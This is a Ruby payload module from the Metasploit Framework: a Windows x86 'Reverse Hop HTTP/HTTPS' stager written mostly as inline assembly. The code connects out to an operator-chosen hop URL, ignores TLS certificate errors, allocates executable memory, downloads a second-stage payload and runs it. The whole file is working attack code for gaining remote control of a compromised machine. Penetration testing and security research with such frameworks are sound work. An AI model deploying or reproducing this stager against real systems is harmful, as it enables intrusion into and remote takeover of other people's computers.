##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'

module MetasploitModule

  CachedSize = 362

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi

  def initialize(info = {})
    super(merge_info(info,
      'Name'           => 'Reverse Hop HTTP/HTTPS Stager',
      'Description'    => %q{
        Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload
        data/hop/hop.php to the PHP server you wish to use as a hop.
      },
      'Author'         => [
         'scriptjunkie <scriptjunkie[at]scriptjunkie.us>',
         'bannedit',
         'hdm'
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Handler'        => Msf::Handler::ReverseHopHttp,
      'Convention'     => 'sockedi http',
      'DefaultOptions' => { 'WfsDelay' => 30 },
      'Stager'         => { 'Offsets' => { } }))

    deregister_options('LHOST', 'LPORT')

    register_options([
      OptString.new('HOPURL', [ true, "The full URL of the hop script", "http://example.com/hop.php" ]
      )
    ])
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTP
  #
  def stage_over_connection?
    false
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    config = transport_config_reverse_http(opts)
    config[:scheme] = URI(datastore['HOPURL']).scheme
    config
  end

  #
  # Generate the first stage
  #
  def generate(_opts = {})
    uri = URI(datastore['HOPURL'])
    #create actual payload
    payload_data = %Q^
      cld            ; clear direction flag
      call start        ; start main routine
      #{asm_block_api}
    ; actual routine
    start:
      pop ebp            ; get ptr to block_api routine

    ; Input: EBP must be the address of 'api_call'.
    ; Output: EDI will be the socket for the connection to the server
    ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
    load_wininet:
      push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
      push 0x696e6977        ; ...
      push esp               ; Push a pointer to the "wininet" string on the stack.
      push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}        ; hash( "kernel32.dll", "LoadLibraryA" )
      call ebp               ; LoadLibraryA( "wininet" )

    internetopen:
      xor edi,edi
      push edi               ; DWORD dwFlags
      push edi               ; LPCTSTR lpszProxyBypass
      push edi               ; LPCTSTR lpszProxyName
      push edi               ; DWORD dwAccessType (PRECONFIG = 0)
      push 0                 ; NULL pointer
      push esp               ; LPCTSTR lpszAgent ("\x00")
      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}        ; hash( "wininet.dll", "InternetOpenA" )
      call ebp

      jmp.i8 dbl_get_server_host

    internetconnect:
      pop ebx                ; Save the hostname pointer
      xor ecx, ecx
      push ecx               ; DWORD_PTR dwContext (NULL)
      push ecx               ; dwFlags
      push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
      push ecx               ; password
      push ecx               ; username
      push #{uri.port} ; PORT
      push ebx               ; HOSTNAME
      push eax               ; HINTERNET hInternet
      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}        ; hash( "wininet.dll", "InternetConnectA" )
      call ebp

      jmp get_server_uri

    httpopenrequest:
      pop ecx
      xor edx, edx           ; NULL
      push edx               ; dwContext (NULL)
    ^

    if uri.scheme == 'http'
      payload_data << '      push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
    else
      payload_data << '      push (0x80000000 | 0x00800000 | 0x00001000 | 0x00002000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
    end
    # 0x80000000 |        ; INTERNET_FLAG_RELOAD
    # 0x00800000 |        ; INTERNET_FLAG_SECURE
    # 0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
    # 0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
    # 0x80000000 |        ; INTERNET_FLAG_RELOAD
    # 0x04000000 |        ; INTERNET_NO_CACHE_WRITE
    # 0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
    # 0x00000200 |        ; INTERNET_FLAG_NO_UI
    # 0x00400000          ; INTERNET_FLAG_KEEP_CONNECTION
    payload_data << %Q^

      push edx               ; accept types
      push edx               ; referrer
      push edx               ; version
      push ecx               ; url
      push edx               ; method
      push eax               ; hConnection
      push #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}        ; hash( "wininet.dll", "HttpOpenRequestA" )
      call ebp
      mov esi, eax           ; hHttpRequest

    set_retry:
      push 0x10
      pop ebx

    httpsendrequest:
      xor edi, edi
      push edi               ; optional length
      push edi               ; optional
      push edi               ; dwHeadersLength
      push edi               ; headers
      push esi               ; hHttpRequest
      push #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}         ; hash( "wininet.dll", "HttpSendRequestA" )
      call ebp
      test eax,eax
      jnz allocate_memory

    try_it_again:
      dec ebx
      jz failure

    ^
    if uri.scheme == 'https'
      payload_data << %Q^
    set_security_options:
      push 0x00003380
        ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
        ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
        ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
        ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
        ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
      mov eax, esp
      push 0x04                 ; sizeof(dwFlags)
      push eax               ; &dwFlags
      push 0x1f              ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
      push esi               ; hRequest
      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}          ; hash( "wininet.dll", "InternetSetOptionA" )
      call ebp
    ^
    end
    payload_data << %Q^
      jmp.i8 httpsendrequest

    dbl_get_server_host:
      jmp get_server_host

    get_server_uri:
      call httpopenrequest

    server_uri:
    db "#{Rex::Text.hexify(uri.request_uri, 99999).strip}?/12345", 0x00

    failure:
      push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}        ; hardcoded to exitprocess for size
      call ebp

    allocate_memory:
      push 0x40         ; PAGE_EXECUTE_READWRITE
      push 0x1000            ; MEM_COMMIT
      push 0x00400000        ; Stage allocation (8Mb ought to do us)
      push edi               ; NULL as we dont care where the allocation is
      push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}       ; hash( "kernel32.dll", "VirtualAlloc" )
      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

    download_prep:
      xchg eax, ebx          ; place the allocated base address in ebx
      push ebx               ; store a copy of the stage base address on the stack
      push ebx               ; temporary storage for bytes read count
      mov edi, esp           ; &bytesRead

    download_more:
      push edi               ; &bytesRead
      push 8192              ; read length
      push ebx               ; buffer
      push esi               ; hRequest
      push #{Rex::Text.block_api_hash('kernel32.dll', 'InternetReadFile')}       ; hash( "wininet.dll", "InternetReadFile" )
      call ebp

      test eax,eax           ; download failed? (optional?)
      jz failure

      mov eax, [edi]
      add ebx, eax           ; buffer += bytes_received

      test eax,eax           ; optional?
      jnz download_more      ; continue until it returns 0
      pop eax                ; clear the temporary storage

    execute_stage:
      ret                    ; dive into the stored stage address

    get_server_host:
      call internetconnect

    server_host:
      db "#{Rex::Text.hexify(uri.host, 99999).strip}", 0x00
    ^
    module_info['Stager']['Assembly'] = payload_data.to_s
    super
  end
end
